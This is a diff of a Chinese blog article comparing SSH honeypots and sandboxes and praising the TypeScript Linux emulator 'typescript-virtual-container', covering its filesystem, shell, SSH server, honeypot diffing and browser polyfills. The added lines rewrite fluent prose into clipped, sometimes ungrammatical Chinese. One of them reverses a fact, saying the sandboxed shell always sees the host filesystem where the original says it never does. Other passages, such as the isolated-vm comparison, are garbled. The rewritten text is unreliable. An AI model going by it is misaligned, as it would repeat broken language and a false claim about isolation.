-| **交互度** | 中高 | 中 | 零 | 零 | 视情况 | 低 |
-| **真实 SSH 协议** | ✅ | ✅ | ❌ (拖拽) | ✅ | 视情况 | ✅ |
-| **Shell 保真度** | 中 | 中 | 不适用 | 无 | 视情况 | 最低 |
-| **捕获凭据** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
-| **捕获命令** | ✅ | ✅ | ❌ | ✅ | 视情况 | ✅ |
-| **捕获恶意软件** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
-| **SIEM 集成** | ✅ 原生 | ❌ | ❌ | ❌ | ❌ | 手动 |
-| **LLM 响应** | ✅（新） | ❌ | ❌ | ❌ | ❌ | ❌ |
+| **交互级别** | 中高 | 中 | 零 | 零 | 可变 | 低 |
+| **真 SSH 协议** | ✅ | ✅ | ❌（tarpit） | ✅ | 可变 | ✅ |
+| **shell 逼真** | 中 | 中 | 无 | 无 | 可变 | 极小 |
+| **抓凭证** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
+| **抓命令** | ✅ | ✅ | ❌ | ✅ | 可变 | ✅ |
+| **抓恶意软件** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
+| **SIEM 集成** | ✅ 原生 | ❌ | ❌ | ❌ | ❌ | 手工 |
+| **LLM 回复** | ✅（新） | ❌ | ❌ | ❌ | ❌ | ❌ |
 | **语言** | Python | Python | C | Go | Docker | Node.js |
 | **Node.js 原生** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
-| **状态** | ✅ 非常活跃 | ⚠️ 已归档 | ✅ 活跃 | ✅ 活跃 | ✅ 活跃 | 自行 DIY |
+| **状态** | ✅ 很活跃 | ⚠️ 归档 | ✅ 活跃 | ✅ 活跃 | ✅ 活跃 | 手搓 |
 
-这里的模式很清楚：你想要越高的保真度，就需要写越多的 Python。如果你认真做这件事，Cowrie 是明确的赢家----它经过多年的实战检验，捕获的远不止凭据。endlessh 和 sshesame 更像是好玩的小项目，而不是严肃的威胁情报工具。而朴素的 Node.js 方法只能走 20%，然后就会撞到天花板。
-
+规律清楚：逼真要写 Python。认真干选 Cowrie，生产验证多年，抓的不只凭证。endlessh 和 sshesame 算好玩项目多过正经威胁情报工具。天真 Node.js 版走到 20% 撞墙。
 ---
 
-## 第 5 部分 ---- `typescript-virtual-container`：填补了什么空白
+## 第 5 部分，`typescript-virtual-container`：补缺口的那个
 
-好了，到这里事情变得有趣了。在整理了以上所有家族之后，缺失的象限变得相当明显：
+好，戏肉来了。把上面全家族摆完，缺的象限很明显：
 
-- JS 沙箱：隔离代码，没有 Shell，没有文件系统，没有 SSH
-- Linux 仿真器：真实操作系统，真实 Shell，真实 SSH……但 150+ MB RAM、30 秒启动、需要你在串行 I/O 之上构建自己的 API
-- 蜜罐：伪造的 Shell，没有可编程 API，Python/Go/C，不是 Node 原生
+- JS 沙箱：隔离代码，无 shell、无文件系统、无 SSH
+- Linux 模拟器：真 OS、真 shell、真 SSH……但 150M+ 内存、30 秒启动，还得自己在串口 I/O 上搭 API
+- 蜜罐：假 shell、无可编程 API、Python/Go/C、非 Node 原生
 
-没有人构建过一个完整的、可编程的、Node 原生的 Linux 环境----带有真实 SSH、真实权限、真实的虚拟网络和类型化的 TypeScript API。所以她构建了它。
+没人做过 Node 原生、完整可编程、真 SSH、真权限、真虚拟网络、TypeScript 类型化 API 的 Linux 完整环境。所以她做了。
 
-快速介绍一下，因为这是我第一次正式提到她：`typescript-virtual-container` 由 [Chloé Rolzhausen](https://itsrealfortune.fr) 构建，她是一位法国开发者，网上使用 **Fortune**（或 ItsRealFortune）的名字。你可以在她的[网站](https://itsrealfortune.fr)和 [LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316//) 上找到她。整个项目----56k 行 TypeScript、247 个文件、170 个命令----是一个人独立完成的。在本文接下来的部分我会称她为 Fortune。是的，这挺疯狂的。去看看她的作品吧！
+先正式介绍一次因为第一次好好提：`typescript-virtual-container` 是[Chloé Rolzhausen](https://itsrealfortune.fr) 做的，法国开发者，网上叫 **Fortune**（或 ItsRealFortune）。她的[网站](https://itsrealfortune.fr)和 [LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316/) 能找到她。整个项目，5.6 万行 TypeScript、247 文件、170 命令，一个人 solo。后面叫她 Fortune。对，挺疯的。去看看她的活！
 
-### 它实际上是什么
+### 到底是什么
 
-`typescript-virtual-container` 是一个纯 TypeScript 编写的 **Linux 环境模拟器**。没有 Wasm。没有原生插件。没有内核。约 56,000 行源码，分布在 247 个 TypeScript 文件中。
+`typescript-virtual-container` 是纯 TypeScript 写的 **Linux 环境仿真器**。无 Wasm、无原生扩展、无内核。源码约 5.6 万行，247 个 TypeScript 文件。
 
-关键洞察：你不需要 CPU 仿真器来让 `ls /etc | grep passwd` 工作。你需要的是：
-1. 一个响应路径操作的内存节点树
-2. 每次访问都强制执行的 POSIX 权限模型
-3. 一个理解管道、重定向、子 Shell 和变量展开的 Shell 解析器
-4. 约 170 个命令实现（函数，不是二进制文件）
-5. 一套用户和组管理系统
-6. 通过 SSH 暴露所有这些的东西
+关键洞察：跑 `ls /etc | grep passwd` 用不着 CPU 模拟器。要：
+1. 内存里响应路径操作的类型节点树
+2. 每次访问按请求 uid/gid 走的 POSIX 权限模型
+3. 懂管道、重定向、子 shell、变量展开的 shell 语法解析器
+4. 约 170 个命令实现（函数，不是二进制）
+5. 用户和组管理系统
+6. 经 SSH 暴露一切的东西
 
-所有这一切都可以在纯 TypeScript 中实现，无需内核参与。
+纯 TypeScript 全搞定，内核不用出场。
 
 ### VirtualFileSystem
 
-VFS 是一个类型化节点的内存树----除非你显式启用 `"fs"` 持久化模式，否则没有磁盘 I/O：
+VFS 是内存类型节点树，无显式开 `"fs"` 持久模式不碰磁盘 I/O：
 
 ```ts
-// 简化的内部表示
+// 简化内部表示
 type InternalNode =
   | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
   | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
   | { type: "symlink"; target: string }
   | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
-  | { type: "stub" }; // 惰性加载占位符
+  | { type: "stub" }; // 懒加载占位
 ```
 
-每个路径操作都会经过 `normalizePath`（解析 `.`、`..`、符号链接）和 `enforceAccess`（根据请求的 uid/gid 检查读/写/执行权限）。`chmod`、`chown`、粘滞位和 setuid 都已实现并实际强制执行。如果以 uid 1000 运行的进程试图读取 root 所有、模式 0600 的文件，它会得到 EACCES----不是假的 EACCES，而是权限检查抛出的真正 JavaScript `Error`。这部分做得相当优雅。
+每条路径操作过 `normalizePath`（解 `.`、`..`、符号链接）和 `enforceAccess`（按请求 uid/gid 查读/写/执行权限）。`chmod`、`chown`、sticky 位、setuid 全实现真执行。uid 1000 进程读 root 0600 文件，拿 EACCES，不是假 EACCES，是权限检查抛的真 JavaScript `Error`。这块挺优雅说实话。
 
-VFS 可以序列化为：
-- `.vfsb` ---- 紧凑的二进制格式（自定义，使用 fflate 压缩）---- 这是默认格式
-- JSON 快照 ---- 人类可读，适合调试
-- TAR 归档 ---- 使用真实 tar 格式的导入/导出，所以你可以 `tar -xf` 某些东西，VFS 就……有了那些文件
-- SquashFS 镜像 ---- 只读导入
+VFS 序列化：
+- `.vfsb`，紧凑自定义二进制格式（fflate 压缩），默认格式
+- JSON 快照，人可读，调错好
+- TAR 档，真 tar 格式导进导出，所以 `tar -xf` 东西 VFS 里就……有这些文件了
+- SquashFS 镜像，只读导入
 
-在 `"fs"` 持久化模式下，它维护一个预写日志（WAL）用于崩溃恢复----写入先进入日志，然后在刷新时写入快照。如果 Node 在操作中途崩溃，日志可以让你重建最后一个完整状态。
+`"fs"` 持久模式维护预写日志（WAL）做崩溃恢复，写先进日志，flush 进快照。Node 半路挂了，日志重建最后完整态。
 
-还有一个 `FileCache` 层用于模拟磁盘 I/O 延迟。你可以配置像 `NVME_DISK_IO` 或 `HDD_DISK_IO` 之类的配置文件，VFS 会人为延迟文件操作以匹配真实的时间。这有点搞笑----软件故意放慢速度来模拟硬件----但实际非常有用，特别是做基准测试时。
+还有 `FileCache` 层仿磁盘 I/O 延迟。配 `NVME_DISK_IO`、`HDD_DISK_IO` 这类 profile，VFS 故意拖文件操作到贴真时序。挺逗，软件故意跑慢装硬件，但 benchmark 真有用。
 
-### Shell 解释器
+### shell 解释器
 
-Shell 解析器生成一个类型化的 AST：
+shell 解析器产类型化 AST：
 
 ```ts
-// "ls /etc | grep root && echo done" 解析为：
+// "ls /etc | grep root && echo done" 解析成：
 {
   type: "statement",
   pipeline: [
@@ -794,22 +791,22 @@ Shell 解析器生成一个类型化的 AST：
 }
 ```
 
-执行器遍历这个 AST：
-- 对于管道，创建 `{ stdin, stdout, stderr }` 流链，用管道 I/O 执行每个命令
-- 对于逻辑运算符（`&&`、`||`），在运行右侧之前检查 `$?`
-- 对于子 Shell（`$(...)`、`` ` ` ``），分叉执行上下文
-- 对于重定向（`>file`、`>>file`、`2>&1`、`<file`），在执行前设置流接线
-- 对于后台作业（`cmd &`），不等完成就运行
-- 对于变量，展开 `$VAR`、`${VAR:-default}`、`${#VAR}` 和算术 `$((expr))`
-- 对于大括号展开（`{a,b,c}`、`{1..5}`），在执行前生成完整的展开列表
+执行器走 AST：
+- 管道：建 `{ stdin, stdout, stderr }` 流链，每个命令 I/O 管道接好跑
+- 逻辑操作（`&&`、`||`）：查 `$?` 再定跑不跑右边
+- 子 shell（`$(...)`、反引号）：分叉执行上下文
+- 重定向（`>文件`、`>>文件`、`2>&1`、`<文件`）：跑前接好流线
+- 后台任务（`cmd &`）：不等待跑
+- 变量：展开 `$VAR`、`${VAR:-default}`、`${#VAR}`、算术 `$((expr))`
+- 花括号展开（`{a,b,c}`、`{1..5}`）：跑前展全列表
 
-所有这些都是真正的 POSIX Shell 行为。解析器处理 heredocs、进程替换、通配符（`*`、`?`、`[abc]`）和引号处理（单引号、带插值的双引号、反斜杠转义）。它不是完美的----边缘情况肯定存在----但远超你对一个 TypeScript 项目的预期。
+全是真 POSIX shell 行为。解析器管 heredoc、进程替换、glob（`*`、`?`、`[abc]`）、引号（单引、双引内插值、反斜杠转义）。边角 case 有，但超 TypeScript 项目预期了。
 
 ### 约 170 个内置命令
 
-命令是在命令注册表中注册的 TypeScript 函数。它们接收一个 `CommandContext`，包含 stdin/stdout/stderr 流、VFS、用户会话、Shell 环境以及访问子模块的权限。
+命令是 TypeScript 函数，注册进命令注册表。收 `CommandContext`，带 stdin/stdout/stderr 流、VFS、shell 用户、shell 环境、子模块访问。
 
-写 170 个 Unix 命令实现……工程量很大。有些是微不足道的（`echo`、`true`、`false`），有些则复杂得令人惊讶（`awk`、`find`、`tar`）。比如，完整的 POSIX `awk`？用 TypeScript？说实话这太疯狂了。以下是里面的一些例子：
+写 170 个 Unix 命令实现，多……有的 trivial（`echo`、`true`、`false`），有的惊人复杂（`awk`、`find`、`tar`）。完整 POSIX `awk` TypeScript 写？疯真的。抽样里面有：
 
 ```
 cat, ls, cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp,
@@ -817,23 +814,23 @@ ln, readlink, find, locate, stat, file,
 echo, printf, read, test, [, [[,
 grep, sed, awk, cut, sort, uniq, wc, head, tail, tr,
 ps, top, kill, pkill, nice, ionice,
-ssh, scp, sftp（客户端，向外连接）,
+ssh, scp, sftp（客户端，出向连接）,
 ping, curl, wget, nc, netstat, ss, ip, ifconfig, route,
 apt, apt-get, apt-cache, dpkg, pacman,
 useradd, usermod, userdel, groupadd, passwd, su, sudo,
 tar, gzip, gunzip, bzip2, bunzip2, xz, unxz, zip, unzip,
-git（存根）, python3（存根）, node（存根）,
-nano（完整交互式编辑器）, vim（基础）, vi（基础）,
+git（stub）, python3（stub）, node（stub）,
+nano（完整交互编辑器）, vim（基础）, vi（基础）,
 neofetch, htop, tree, df, du, free, uptime, who, w, last,
-cron（模拟版）, systemctl（存根）, journalctl（存根）,
-……以及大约 130 多个
+cron（仿真）, systemctl（stub）, journalctl（stub）,
+...还有约 130 个
 ```
 
-"存根"（git、python3、node）对常见调用做出逼真响应----`python3 --version` 返回可信的版本字符串、`git status` 显示伪造的仓库状态----但不做真正的工作。对于蜜罐来说，这些实际上比真实的东西更有用，因为它们让你可以观察攻击者试图运行什么，而无需真正执行任何有害的操作。
+"stub"（git、python3、node）对常见调用回逼真，`python3 --version` 回可信版本串，`git status` 显示虚构仓库状态，不真干活。蜜罐里这些比真命令有用，看攻击者试跑什么又真不跑危险的。
 
 ### SSH 服务器
 
-SSH 层使用真正的 `ssh2` npm 包----真实的 SSH 协议、真正的密钥交换、真正的加密。`SSHMimic` 封装了它：
+SSH 层用真 npm `ssh2` 包，真 SSH 协议、真密钥交换、真加密。`SSHMimic` 包一层：
 
 ```ts
 import { VirtualSshServer } from "typescript-virtual-container";
@@ -848,16 +845,16 @@ const ssh = new VirtualSshServer({
   },
 });
 await ssh.start();
-// 真实的 SSH：ssh -p 2222 root@localhost
-// 真实的 SFTP：sftp -P 2222 root@localhost
-// 真实的 SCP：scp -P 2222 file root@localhost:/tmp/
+// 真 SSH：ssh -p 2222 root@localhost
+// 真 SFTP：sftp -P 2222 root@localhost
+// 真 SCP：scp -P 2222 file root@localhost:/tmp/
 ```
 
-`shellProperties` 决定了 `uname -a`、`lsb_release -a`、`neofetch`、`/proc/version` 和 `/etc/os-release` 报告的内容。你可以令人信服地冒充任何 Linux 发行版和内核版本----对真正的 SSH 客户端来说，实际上无法区分。
+`shellProperties` 定 `uname -a`、`lsb_release -a`、`neofetch`、`/proc/version`、`/etc/os-release` 报什么。装任何 Linux 发行版和内核版本逼真，真 SSH 客户端没法分辨。
 
 ### HoneyPot 模块
 
-因为 Shell 解释器是真实的、SSH 服务器也是真实的，攻击者的命令实际上在虚拟环境中执行。攻击者触发的 `wget` 请求会记录目标 URL。攻击者创建的文件会保存在 VFS 中。攻击者提权尝试会产生逼真的错误。
+shell 解释器是真的，SSH 服务器是真的，攻击者命令真在虚拟环境跑。攻击者触发的 `wget` 请求带目标 URL 记日志。攻击者建的文件进 VFS 存着。攻击者提权尝试拿逼真报错。
 
 ```ts
 import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";
@@ -871,9 +868,9 @@ const pot = new HoneyPot({
 const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
 await ssh.start();
 
-// 会话结束后，比较文件系统的差异
+// session 后 diff 文件系统
 const before = shell.vfs.toSnapshot();
-// ... 攻击者会话 ...
+// ... 攻击者 session ...
 const after = shell.vfs.toSnapshot();
 const diff = diffSnapshots(before, after);
 /*
@@ -885,29 +882,29 @@ const diff = diffSnapshots(before, after);
 */
 ```
 
-这与 Cowrie 有本质区别。Cowrie 的伪文件系统可以响应 `ls`，但无法真正跟踪攻击者创建了哪些文件以及他们做了什么修改并以结构化差异的形式呈现。`typescript-virtual-container` 可以，因为 VFS 是一个实时的数据结构----每次写入都被跟踪。攻击者刚刚添加的那个 cron 条目？在差异里。那个 `.hidden` 文件夹？在差异里。对恶意软件分析来说非常有用。
+和 Cowrie 质变不同。Cowrie 假文件系统回 `ls`，但攻击者建的文件和改动跟不出结构化 diff。`typescript-virtual-container` 行，因为 VFS 是活数据结构，每写跟踪。攻击者刚加的 cron 在 diff 里。`.hidden` 目录在 diff 里。恶意分析好用。
 
 ### 虚拟网络栈
 
-这可能是整个项目中最令人印象深刻的部分，在这方面的领域内没有任何其他项目可以比拟。一个完整的 L2/L3 虚拟网络栈，带 VPN 支持，纯 TypeScript 编写，无需真实网卡参与。这真的非常疯狂。
+全项目可能最 impress 的部分，别家全无。纯 TypeScript 完整 L2/L3 虚拟网络栈加 VPN 支持，真网卡一块没有。疯真的。
 
-`VirtualNetworkManager` 为每个 `VirtualShell` 实例提供虚拟网络接口，配有可配置的 IP 地址、路由表和一个软件防火墙（带 conntrack 和 NAT 的 iptables 风格规则）。`ip addr`、`ip route`、`iptables -L`、`netstat -rn` 都显示虚拟网络状态。
+`VirtualNetworkManager` 给每个 `VirtualShell` 实例配虚拟网卡、可配 IP、路由表、软件防火墙（iptables 风格规则，conntrack 加 NAT）。`ip addr`、`ip route`、`iptables -L`、`netstat -rn` 全看虚拟网络态。
 
-`VirtualSwitch`（名为 Baie----来自法语词汇"服务器机柜"，"baie informatique"）将多个 Shell 连接到一个共享子网上。它实现了：
+`VirtualSwitch`（取名 Baie，法语服务器机柜"baie informatique"）连多 shell 上共享子网。实现：
 - MAC 学习和 ARP
-- 子网间的 IP 路由
-- NAT（出站地址伪装）
-- DNS（每个子网可配置的记录）
+- 子网间 IP 路由
+- NAT（出向 masquerade）
+- DNS（按子网可配记录）
 - 负载均衡（轮询、最少连接）
-- 流量整形：延迟、抖动（高斯分布）、丢包、突发丢包、乱序、重复
-- 带宽限制（令牌桶）
-- MTU 强制
-- 连接跟踪（有状态的，包含 NEW/ESTABLISHED/TIME_WAIT 状态）
+- 流量塑形：延迟、抖动（高斯分布）、丢包、突发丢、重排、复制
+- 带宽限（令牌桶）
+- MTU 生效
+- 连接跟踪（带状态，NEW/ESTABLISHED/TIME_WAIT 态）
 
 ```ts
 const baie = new Baie("192.168.0.0/24");
 
-// 同一交换机上的三台虚拟机
+// 同交换机三台虚拟机
 const web = new VirtualShell("web");
 const api = new VirtualShell("api");
 const db  = new VirtualShell("db");
@@ -916,29 +913,29 @@ baie.attach(web, "192.168.0.2");
 baie.attach(api, "192.168.0.3");
 baie.attach(db,  "192.168.0.4");
 
-// 防火墙：web 可以访问 api，api 可以访问 db，web 不能直接访问 db
+// 防火墙：web 到 api 通，api 到 db 通，web 直到 db 不通
 baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });
 
-// 流量整形：模拟到外部的不可靠 WAN 链路
+// 流量塑形：模拟到外面不稳 WAN
 baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
 ```
 
-`VirtualVpn` 在 Baie 实例之间创建加密隧道----你可以模拟一个通过 VPN 互联的多站点网络。
+`VirtualVpn` 在 Baie 实例间建加密隧道，仿多站点 VPN 互联网络。
 
-`VirtualProxy` 实现端口转发和 SOCKS5 代理。
+`VirtualProxy` 做端口转发和 SOCKS5 代理。
 
-这些都不涉及真实的网卡。全是 TypeScript 对象路由。`ping` 命令通过虚拟交换机路由并返回模拟的 ICMP 回复来"工作"。`curl http://192.168.0.3/api` 通过虚拟网络路由，命中 api Shell 的模拟 HTTP 响应，并返回内容。这是从里到外一层套一层的抽象，而且是最棒的那种。
+全不碰真网卡。全 TypeScript 对象路由。`ping` "通"靠经虚拟交换机路由回仿真 ICMP 回复。`curl http://192.168.0.3/api` 经虚拟网络路由，到 shell api 仿真 HTTP 响应，回内容。乌龟叠到底，最好意义那种。
 
-### SandboxedShell
+### `SandboxedShell`
 
-对于需要更强隔离的程序化使用场景，`SandboxedShell` 在 Node.js Worker 线程中运行 Shell 会话：
+编程用要更硬隔离，`SandboxedShell` 在 Node Worker 线程跑 shell session：
 
 ```ts
 import { SandboxedShell } from "typescript-virtual-container";
 
 const shell = new SandboxedShell({
   memoryMB: 128,
-  cpuQuota: 0.25, // 一个核心的 25%
+  cpuQuota: 0.25, // 1 核的 25%
   timeoutMs: 5000,
 });
 
@@ -947,11 +944,11 @@ console.log(result.stdout); // "42\n"
 console.log(result.exitCode); // 0
 ```
 
-这里的隔离由 VFS 层（Worker 线程的 Shell 只能看到虚拟文件系统，永远看不到宿主文件系统）加上 Node.js Worker 线程内存隔离来保证。这比 `isolated-vm` 更轻量，但对于 Shell 级别的隔离（而非 JS 级别的隔离）来说更合适。
+隔离靠 VFS 层（worker 线程 shell 只见虚拟文件系统，永见宿主文件系统）加 Node Worker 线程内存隔离。比 `isolated-vm` 轻，但 shell 级隔离对，JS 级不对。
 
-### 资源限制
+### 资源上限
 
-你可以为每个 Shell 配置资源上限，影响系统监控命令的报告结果：
+按 shell 配资源上限，影响系统监控命令报什么：
 
 ```ts
 const shell = new VirtualShell("limited-vm", {}, {}, {
@@ -960,38 +957,38 @@ const shell = new VirtualShell("limited-vm", {}, {}, {
 });
 ```
 
-在该 Shell 中，`free -m` 显示 512 MB 总 RAM。`nproc` 返回 2。`/proc/meminfo` 显示限制后的值。`htop` 和 `top` 显示限制后的 CPU 数量。这让你可以精确设定虚拟机的硬件配置信息。
+这 shell 里 `free -m` 看 512M 总内存。`nproc` 回 2。`/proc/meminfo` 看上限值。`htop` 和 `top` 看上限 CPU 数。模拟机硬件指纹精确可定。
 
 ### 三种部署模式
 
 ```
 模式 1：SSH/SFTP 服务器
   VirtualSshServer / VirtualSftpServer
-  → 真实的 SSH 协议、真实的 SFTP、真实的 SCP
-  → 用例：蜜罐、远程测试环境、培训实验室
+  → 真 SSH 协议，真 SFTP，真 SCP
+  → 场景：蜜罐、远程测试环境、培训实验
 
-模式 2：Web Shell（浏览器）
+模式 2：网页 shell（浏览器）
   builds/fortune-nyx-v1.7.8-web.min.js（ESM 包）
-  → 在浏览器中运行，VFS 持久化到 IndexedDB
-  → 用例：交互式教程、嵌入式终端、演示
-  → 额外功能：运行 startxfce4 获得完整的模拟 XFCE 桌面
+  → 浏览器跑，VFS IndexedDB 持久
+  → 场景：交互教程、嵌入终端、演示
+  → 加分：跑 startxfce4 出完整仿真 XFCE 桌面
 
 模式 3：独立 CLI
-  builds/fortune-nyx-v1.7.8-directbash-k6.1.0.mjs（单文件，无需安装）
-  → curl 后直接运行，VFS 持久化到 .vfs/ 目录
-  → 用例：快速演示、本地实验
+  builds/fortune-nyx-v1.7.8-directbash-k6.1.0.mjs（单文件，免安装）
+  → curl 下就跑，VFS 存 .vfs/ 目录
+  → 场景：快速演示、本地实验
 ```
 
-### 填充库----浏览器构建如何在无需 Wasm 的情况下工作
+### polyfill，浏览器构建不用 Wasm 的秘密
 
-好吧，这部分是我觉得真正巧妙的地方，我想特别提一下。
+我觉得最聪明、想单拎讲的部分。
 
-让 Node.js 库在浏览器中运行通常是一场噩梦。要么用 Wasm 运行时（沉重、加载慢），要么花几周手动替换每个 `node:*` 导入为浏览器兼容的替代品。Fortune 选择了第二种方案----但非常干净利落，通过编写一组位于仓库 `polyfills/` 目录中的自定义填充库。
+Node.js 库搬浏览器一般噩梦。要么 Wasm 运行时（重、加载慢），要么手替每个 `node:*` 导入写浏览器兼容版。Fortune 干了第二个，但很干净，写了套放仓库 `polyfills/` 的定制 polyfill。
 
-构建流水线就是带有大量 `alias` 条目的 esbuild：
+构建流水线就是带一堆 `alias` 项的 esbuild：
 
 ```js
-// demo/build.js ---- 整个浏览器构建配置
+// demo/build.js -- 浏览器构建全配置
 esbuild.build({
   entryPoints: ['app.ts'],
   bundle: true,
@@ -1018,17 +1015,17 @@ esbuild.build({
 });
 ```
 
-没有 Wasm。没有外部填充库。没有 `webpack-node-externals` 这种乱七八糟的东西。只是别名模块和几个注入的全局变量。让我逐一介绍，因为其中一些真的很令人印象深刻。
+无 Wasm，无外部 polyfill 库，不靠 `webpack-node-externals`。模块别名加几个注入全局。每个单拎因为有的真 impress。
 
-**`node:fs` ---- 作为伪文件系统的 IndexedDB**
+**`node:fs`，IndexedDB 当假文件系统**
 
-这是我的最爱。`node:fs` 填充实现了同步的 Node.js fs API（`readFileSync`、`writeFileSync`、`existsSync`、`readdirSync`、`mkdirSync`、`unlinkSync`、`statSync`……），由两层支持：用于同步读取的内存中 `Map`，和用于页面刷新后持久化的 IndexedDB。写入会立即命中 Map（所以 `writeFileSync` 之后马上 `readFileSync` 总能工作），然后异步刷入 IndexedDB。
+我最爱的。`node:fs` polyfill 实现 Node.js 同步 fs API（`readFileSync`、`writeFileSync`、`existsSync`、`readdirSync`、`mkdirSync`、`unlinkSync`、`statSync`……），底下两层：内存 `Map` 同步读，IndexedDB 页面间持久。写先进 Map（所以 `readFileSync` 紧跟 `writeFileSync` 永远对），后台异步刷 IndexedDB。
 
 ```js
-// 同步缓存（路径 → Uint8Array | null）---- 即时读取
+// 同步缓存（路径 → Uint8Array | null），读瞬时
 const memCache = new Map();
 
-// 启动时从 IndexedDB 预加载所有内容到 memCache
+// 启动全量 IndexedDB 预载进 memCache
 openDB().then(db => {
   const tx = db.transaction(STORE, 'readonly');
   const req = tx.objectStore(STORE).openCursor();
@@ -1041,179 +1038,179 @@ openDB().then(db => {
 });
 ```
 
-这就是为什么 VFS 快照能在浏览器中跨越页面刷新而存活----整个 `.vfsb` 二进制文件通过这个填充写入 IndexedDB，下次加载时读回。没有 Wasm。没有服务器。只是 IndexedDB，从 2011 年左右开始每个浏览器就都有了。
+VFS 二进制快照 `.vfsb` 经这 polyfill 写 IndexedDB，下次载页读回，所以浏览器快照刷新不丢。无 Wasm，无服务器。2011 年起浏览器全有 IndexedDB。
 
-**`node:crypto` ---- 纯 JS 的 SHA-256**
+**`node:crypto`，纯 JS SHA-256**
 
-`crypto` 填充没有引入 Wasm 加密库，而是使用 FIPS 180-4 轮常数从头实现了 SHA-256。166 行纯 JS，支持完整的十六进制/base64/Uint8Array 输出。库中的所有哈希操作都通过它----SSH 主机密钥指纹、内部校验和、一切。紧凑、零依赖、开箱即用。
+不引 Wasm 密码库，crypto polyfill 从零按 FIPS 180-4 轮常量实现 SHA-256。166 行纯 JS，hex/base64/Uint8Array 输出全。库内哈希全走它，SSH 宿主密钥指纹、内部校验和，全。紧凑，零依赖，管用。
 
-**`node:os` ---- 读取浏览器的实际硬件**
+**`node:os`，读浏览器真硬件**
 
-这个设计很巧妙。`node:os` 不是返回硬编码的占位值，而是读取 `navigator.deviceMemory` 获取总 RAM、`navigator.hardwareConcurrency` 获取 CPU 数量。所以浏览器构建中的 `neofetch` 报告的实际是你真实机器的信息----而不是编造的"2 核、2GB RAM"存根。
+体贴的细节。不返回写死假值，读 `navigator.deviceMemory` 拿总内存、`navigator.hardwareConcurrency` 拿 CPU 数。所以浏览器构建 `neofetch` 报的东西对得上你真机，不是 "2 核 2G 内存"糊弄 stub。
 
 ```js
 export function totalmem(){
   return navigator?.deviceMemory
     ? navigator.deviceMemory * 1024 * 1024 * 1024
-    : 2 * 1024 * 1024 * 1024; // 2 GB 回退
+    : 2 * 1024 * 1024 * 1024; // 默认 2G
 }
 export function cpus(){
   const n = navigator?.hardwareConcurrency || 2;
-  // 还解析 navigator.userAgent 来猜测 CPU 型号字符串
+  // 还解析 navigator.userAgent 猜 CPU 型号串
   return Array.from({ length: n }, () => ({ model, speed: 2400 }));
 }
 ```
 
-**`node:net`、`ssh2`、`roxify` ---- 诚实的存根**
+**`node:net`、`ssh2`、`roxify`，诚实 stub**
 
-浏览器无法打开 TCP 套接字或运行真实的 SSH，所以这些是存根，当有人尝试使用它们时会抛出一个带有清晰信息的 `NotImplemented` 错误。没有静默失败、没有在期望对象的地方返回 `undefined`。只是响亮而清晰的"这在浏览器中不工作"----这正是你想要的。
+浏览器开不了 TCP socket、跑不了真 SSH，所以 stub 抛明确 `NotImplemented` 错误，信息清楚。失败显式，不在别处返回 `undefined` 让对象缺。就要"浏览器不行"大声清楚，这才是对的。
 
-**`process.js` 和 `buffer.js` ---- 注入的全局变量**
+**`process.js` 和 `buffer.js`，注入全局**
 
-这两个通过 esbuild 的 `inject` 选项注入到每个打包文件的顶部，所以 `process` 和 `Buffer` 无需显式导入就在全局可用。`process.js` 很小：`env`、`version`、`platform: 'browser'`、通过 `queueMicrotask` 实现的 `nextTick`、通过 `performance.now()` 实现的 `uptime`。`buffer.js` 是在 `Uint8Array` 之上的完整 `Buffer` 重新实现----所有 SSH 实现和 VFS 依赖的 `readUInt32BE`、`writeInt16LE`、十六进制/base64 编码方法。
+esbuild `inject` 选项注每文件头，`process` 和 `Buffer` 全局可用无显式导入。`process.js` 极小：`env`、`version`、`platform: 'browser'`、经 `queueMicrotask` 的 `nextTick`、经 `performance.now()` 的 `uptime`。`buffer.js` 是盖 `Uint8Array` 的 `Buffer` 完整重实现，SSH 实现和 VFS 依赖的 `readUInt32BE`、`writeInt16LE`、hex/base64 编码全有。
 
 ---
 
-整套填充库总共大约 640 行手写 JS。没有 npm 包。没有 Wasm。结果是浏览器包就是库本身，原生运行，没有通常 Node 优先库那种"但它真的能在浏览器中工作吗？"的焦虑。如果你好奇的话，值得看看仓库中的 `polyfills/` 文件夹----每个文件都很好地封装且独立可读，这是一种我非常欣赏的风格选择。
+polyfill 全约手写 JS 640 行。无 npm 包，无 Wasm。结果浏览器包就是库本身，原生跑，没有平时"Node 优先库到底浏览器行不行"焦虑。`polyfills/` 目录值得翻，每文件独立可读，风格我很喜欢。
 
 | | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | WebContainers | Cowrie | `typescript-virtual-container` |
 |---|---|---|---|---|---|---|---|---|
-| **类别** | JS 沙箱 | JS 沙箱 | JS 沙箱 | 仿真器 | 仿真器 | Node.js/Wasm | 蜜罐 | 模拟器 |
-| **隔离 JS** | ⚠️ 作用域 | ✅ V8 Isolate | ✅ Wasm | 不适用 | 不适用 | 部分 | 不适用 | ✅ Worker |
-| **真实 Linux 内核** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
-| **Shell 解释器** | ❌ | ❌ | ❌ | ✅（真实） | ✅（真实） | ✅（真实） | 部分 | ✅（自定义） |
-| **约 170 个 Unix 命令** | ❌ | ❌ | ❌ | ✅ | ✅ | 部分 | ~20 | ✅ |
-| **POSIX 权限** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | 部分 | ✅ 强制执行 |
-| **用户管理** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | 最小化 | ✅ 完整 |
